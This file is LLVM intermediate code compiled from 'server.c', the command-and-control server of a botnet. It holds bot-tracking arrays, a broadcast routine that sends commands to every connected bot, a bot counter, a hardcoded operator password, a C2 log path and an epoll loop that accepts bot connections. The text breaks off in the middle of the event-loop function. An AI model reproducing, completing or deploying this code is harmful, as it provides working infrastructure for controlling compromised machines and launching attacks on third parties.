; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.__sigset_t = type { [16 x i64] }
%struct.args = type { i32, %struct.sockaddr_in }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.3 = private unnamed_addr constant [17 x i8] c"!* LUCKYLILDUDE\0A\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"!* TELNET\0A\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"PONG!\0A\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"FUCKYOU\00", align 1
@.str.8 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.9 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.12 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"sexg0d69\00", align 1
@.str.14 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.15 = private unnamed_addr constant [24 x i8] c"[ ~ KEEP HACKING! ~ ]\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [4 x i8] c"~$ \00", align 1
@.str.17 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.18 = private unnamed_addr constant [18 x i8] c"BOTS ONLINE: %d\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [13 x i8] c"/var/log/cnc\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.21 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.22 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.23 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.24 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.25 = private unnamed_addr constant [36 x i8] c"%s [BOT PORT] [THREADS] [CNC PORT]\0A\00", align 1
@fileFD = internal global %struct._IO_FILE* null, align 8
@.str.26 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.27 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.28 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.29 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.30 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.31 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 1, i32* %5, align 4
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @strcmp(i8* %7, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #10
  %9 = icmp eq i32 %8, 0
  br i1 %9, label %10, label %11

10:                                               ; preds = %2
  store i32 0, i32* %5, align 4
  br label %11

11:                                               ; preds = %10, %2
  store i32 0, i32* %6, align 4
  br label %12

12:                                               ; preds = %72, %11
  %13 = load i32, i32* %6, align 4
  %14 = icmp slt i32 %13, 1000000
  br i1 %14, label %15, label %75

15:                                               ; preds = %12
  %16 = load i32, i32* %6, align 4
  %17 = load i32, i32* %4, align 4
  %18 = icmp eq i32 %16, %17
  br i1 %18, label %36, label %19

19:                                               ; preds = %15
  %20 = load i32, i32* %6, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %21
  %23 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %22, i32 0, i32 1
  %24 = load i8, i8* %23, align 4
  %25 = icmp ne i8 %24, 0
  br i1 %25, label %37, label %26

26:                                               ; preds = %19
  %27 = load i32, i32* %5, align 4
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %36, label %29

29:                                               ; preds = %26
  %30 = load i32, i32* %6, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %31
  %33 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %37, label %36

36:                                               ; preds = %29, %26, %15
  br label %72

37:                                               ; preds = %29, %19
  %38 = load i32, i32* %5, align 4
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %50

40:                                               ; preds = %37
  %41 = load i32, i32* %6, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %42
  %44 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %43, i32 0, i32 0
  %45 = load i32, i32* %44, align 4
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %50

47:                                               ; preds = %40
  %48 = load i32, i32* %6, align 4
  %49 = call i64 @send(i32 %48, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0), i64 0, i32 16384)
  br label %50

50:                                               ; preds = %47, %40, %37
  %51 = load i32, i32* %6, align 4
  %52 = load i8*, i8** %3, align 8
  %53 = load i8*, i8** %3, align 8
  %54 = call i64 @strlen(i8* %53) #10
  %55 = call i64 @send(i32 %51, i8* %52, i64 %54, i32 16384)
  %56 = load i32, i32* %5, align 4
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %58, label %68

58:                                               ; preds = %50
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %60
  %62 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %61, i32 0, i32 0
  %63 = load i32, i32* %62, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %68

65:                                               ; preds = %58
  %66 = load i32, i32* %6, align 4
  %67 = call i64 @send(i32 %66, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0), i64 0, i32 16384)
  br label %71

68:                                               ; preds = %58, %50
  %69 = load i32, i32* %6, align 4
  %70 = call i64 @send(i32 %69, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0), i64 1, i32 16384)
  br label %71

71:                                               ; preds = %68, %65
  br label %72

72:                                               ; preds = %71, %36
  %73 = load i32, i32* %6, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %6, align 4
  br label %12, !llvm.loop !11

75:                                               ; preds = %12
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @epollEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %18 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #11
  %19 = bitcast i8* %18 to %struct.epoll_event*
  store %struct.epoll_event* %19, %struct.epoll_event** %4, align 8
  br label %20

20:                                               ; preds = %1, %262
  %21 = load volatile i32, i32* @epollFD, align 4
  %22 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %23 = call i32 @epoll_wait(i32 %21, %struct.epoll_event* %22, i32 1000000, i32 -1)
  store i32 %23, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %24

24:                                               ; preds = %259, %20
  %25 = load i32, i32* %7, align 4
  %26 = load i32, i32* %6, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %262

28:                                               ; preds = %24
  %29 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %29, i64 %31
  %33 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 1
  %35 = and i32 %34, 8
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %55, label %37

37:                                               ; preds = %28
  %38 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %38, i64 %40
  %42 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 1
  %44 = and i32 %43, 16
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %55, label %46

46:                                               ; preds = %37
  %47 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %48 = load i32, i32* %7, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %47, i64 %49
  %51 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i32 0, i32 0
  %52 = load i32, i32* %51, align 1
  %53 = and i32 %52, 1
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %74, label %55

55:                                               ; preds = %46, %37, %28
  %56 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %56, i64 %58
  %60 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i32 0, i32 1
  %61 = bitcast %union.epoll_data* %60 to i32*
  %62 = load i32, i32* %61, align 1
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %63
  %65 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %64, i32 0, i32 1
  store i8 0, i8* %65, align 4
  %66 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %67 = load i32, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %66, i64 %68
  %70 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i32 0, i32 1
  %71 = bitcast %union.epoll_data* %70 to i32*
  %72 = load i32, i32* %71, align 1
  %73 = call i32 @close(i32 %72)
  br label %259

74:                                               ; preds = %46
  %75 = load volatile i32, i32* @listenFD, align 4
  %76 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %77 = load i32, i32* %7, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %76, i64 %78
  %80 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i32 0, i32 1
  %81 = bitcast %union.epoll_data* %80 to i32*
  %82 = load i32, i32* %81, align 1
  %83 = icmp eq i32 %75, %82
  br i1 %83, label %84, label %183

84:                                               ; preds = %74
  br label %85

85:                                               ; preds = %84, %148, %151, %175
  store i32 16, i32* %9, align 4
  %86 = load volatile i32, i32* @listenFD, align 4
  %87 = call i32 @accept(i32 %86, %struct.sockaddr* %8, i32* %9)
  store i32 %87, i32* %10, align 4
  %88 = load i32, i32* %10, align 4
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %90, label %100

90:                                               ; preds = %85
  %91 = call i32* @__errno_location() #12
  %92 = load i32, i32* %91, align 4
  %93 = icmp eq i32 %92, 11
  br i1 %93, label %98, label %94

94:                                               ; preds = %90
  %95 = call i32* @__errno_location() #12
  %96 = load i32, i32* %95, align 4
  %97 = icmp eq i32 %96, 11
  br i1 %97, label %98, label %99

98:                                               ; preds = %94, %90
  br label %182

99:                                               ; preds = %94
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  br label %182

100:                                              ; preds = %85
  %101 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %101, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 2
  %105 = load i32, i32* %10, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %106
  %108 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %107, i32 0, i32 0
  store i32 %104, i32* %108, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %109

109:                                              ; preds = %138, %100
  %110 = load i32, i32* %11, align 4
  %111 = icmp slt i32 %110, 1000000
  br i1 %111, label %112, label %141

112:                                              ; preds = %109
  %113 = load i32, i32* %11, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %114
  %116 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %115, i32 0, i32 1
  %117 = load i8, i8* %116, align 4
  %118 = icmp ne i8 %117, 0
  br i1 %118, label %119, label %123

119:                                              ; preds = %112
  %120 = load i32, i32* %11, align 4
  %121 = load i32, i32* %10, align 4
  %122 = icmp eq i32 %120, %121
  br i1 %122, label %123, label %124

123:                                              ; preds = %119, %112
  br label %138

124:                                              ; preds = %119
  %125 = load i32, i32* %11, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %126
  %128 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %127, i32 0, i32 0
  %129 = load i32, i32* %128, align 8
  %130 = load i32, i32* %10, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %131
  %133 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %132, i32 0, i32 0
  %134 = load i32, i32* %133, align 8
  %135 = icmp eq i32 %129, %134
  br i1 %135, label %136, label %137

136:                                              ; preds = %124
  store i32 1, i32* %12, align 4
  br label %141

137:                                              ; preds = %124
  br label %138

138:                                              ; preds = %137, %123
  %139 = load i32, i32* %11, align 4
  %140 = add nsw i32 %139, 1
  store i32 %140, i32* %11, align 4
  br label %109, !llvm.loop !12

141:                                              ; preds = %136, %109
  %142 = load i32, i32* %12, align 4
  %143 = icmp ne i32 %142, 0
  br i1 %143, label %144, label %154

144:                                              ; preds = %141
  %145 = load i32, i32* %10, align 4
  %146 = call i64 @send(i32 %145, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0), i64 16, i32 16384)
  %147 = icmp eq i64 %146, -1
  br i1 %147, label %148, label %151

148:                                              ; preds = %144
  %149 = load i32, i32* %10, align 4
  %150 = call i32 @close(i32 %149)
  br label %85

151:                                              ; preds = %144
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  br label %85

154:                                              ; preds = %141
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @make_socket_non_blocking(i32 %155)
  store i32 %156, i32* %5, align 4
  %157 = load i32, i32* %5, align 4
  %158 = icmp eq i32 %157, -1
  br i1 %158, label %159, label %162

159:                                              ; preds = %154
  %160 = load i32, i32* %10, align 4
  %161 = call i32 @close(i32 %160)
  br label %182

162:                                              ; preds = %154
  %163 = load i32, i32* %10, align 4
  %164 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %165 = bitcast %union.epoll_data* %164 to i32*
  store i32 %163, i32* %165, align 1
  %166 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %166, align 1
  %167 = load volatile i32, i32* @epollFD, align 4
  %168 = load i32, i32* %10, align 4
  %169 = call i32 @epoll_ctl(i32 %167, i32 1, i32 %168, %struct.epoll_event* %3) #11
  store i32 %169, i32* %5, align 4
  %170 = load i32, i32* %5, align 4
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %172, label %175

172:                                              ; preds = %162
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  %173 = load i32, i32* %10, align 4
  %174 = call i32 @close(i32 %173)
  br label %182

175:                                              ; preds = %162
  %176 = load i32, i32* %10, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %177
  %179 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %178, i32 0, i32 1
  store i8 1, i8* %179, align 4
  %180 = load i32, i32* %10, align 4
  %181 = call i64 @send(i32 %180, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i64 0, i64 0), i64 10, i32 16384)
  br label %85

182:                                              ; preds = %172, %159, %99, %98
  br label %259

183:                                              ; preds = %74
  %184 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %185 = load i32, i32* %7, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %184, i64 %186
  %188 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %187, i32 0, i32 1
  %189 = bitcast %union.epoll_data* %188 to i32*
  %190 = load i32, i32* %189, align 1
  store i32 %190, i32* %13, align 4
  %191 = load i32, i32* %13, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %192
  store %struct.clientdata_t* %193, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %194 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %195 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %194, i32 0, i32 1
  store i8 1, i8* %195, align 4
  br label %196

196:                                              ; preds = %183, %247
  %197 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %197, i8 0, i64 2048, i1 false)
  br label %198

198:                                              ; preds = %230, %229, %224, %196
  %199 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %199, i8 0, i64 2048, i1 false)
  %200 = icmp ne i8* %199, null
  br i1 %200, label %201, label %207

201:                                              ; preds = %198
  %202 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %203 = load i32, i32* %13, align 4
  %204 = call i32 @fdgets(i8* %202, i32 2048, i32 %203)
  %205 = sext i32 %204 to i64
  store i64 %205, i64* %16, align 8
  %206 = icmp sgt i64 %205, 0
  br label %207

207:                                              ; preds = %201, %198
  %208 = phi i1 [ false, %198 ], [ %206, %201 ]
  br i1 %208, label %209, label %233

209:                                              ; preds = %207
  %210 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %211 = call i8* @strstr(i8* %210, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0)) #10
  %212 = icmp eq i8* %211, null
  br i1 %212, label %213, label %214

213:                                              ; preds = %209
  store i32 1, i32* %15, align 4
  br label %233

214:                                              ; preds = %209
  %215 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %215)
  %216 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %217 = call i32 @strcmp(i8* %216, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #10
  %218 = icmp eq i32 %217, 0
  br i1 %218, label %219, label %225

219:                                              ; preds = %214
  %220 = load i32, i32* %13, align 4
  %221 = call i64 @send(i32 %220, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0), i64 5, i32 16384)
  %222 = icmp eq i64 %221, -1
  br i1 %222, label %223, label %224

223:                                              ; preds = %219
  store i32 1, i32* %15, align 4
  br label %233

224:                                              ; preds = %219
  br label %198, !llvm.loop !13

225:                                              ; preds = %214
  %226 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %227 = call i32 @strcmp(i8* %226, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0)) #10
  %228 = icmp eq i32 %227, 0
  br i1 %228, label %229, label %230

229:                                              ; preds = %225
  br label %198, !llvm.loop !13

230:                                              ; preds = %225
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %232 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0), i8* %231)
  br label %198, !llvm.loop !13

233:                                              ; preds = %223, %213, %207
  %234 = load i64, i64* %16, align 8
  %235 = icmp eq i64 %234, -1
  br i1 %235, label %236, label %242

236:                                              ; preds = %233
  %237 = call i32* @__errno_location() #12
  %238 = load i32, i32* %237, align 4
  %239 = icmp ne i32 %238, 11
  br i1 %239, label %240, label %241

240:                                              ; preds = %236
  store i32 1, i32* %15, align 4
  br label %241

241:                                              ; preds = %240, %236
  br label %248

242:                                              ; preds = %233
  %243 = load i64, i64* %16, align 8
  %244 = icmp eq i64 %243, 0
  br i1 %244, label %245, label %246

245:                                              ; preds = %242
  store i32 1, i32* %15, align 4
  br label %248

246:                                              ; preds = %242
  br label %247

247:                                              ; preds = %246
  br label %196

248:                                              ; preds = %245, %241
  %249 = load i32, i32* %15, align 4
  %250 = icmp ne i32 %249, 0
  br i1 %250, label %251, label %256

251:                                              ; preds = %248
  %252 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %253 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %252, i32 0, i32 1
  store i8 0, i8* %253, align 4
  %254 = load i32, i32* %13, align 4
  %255 = call i32 @close(i32 %254)
  br label %256

256:                                              ; preds = %251, %248
  br label %257

257:                                              ; preds = %256
  br label %258

258:                                              ; preds = %257
  br label %259

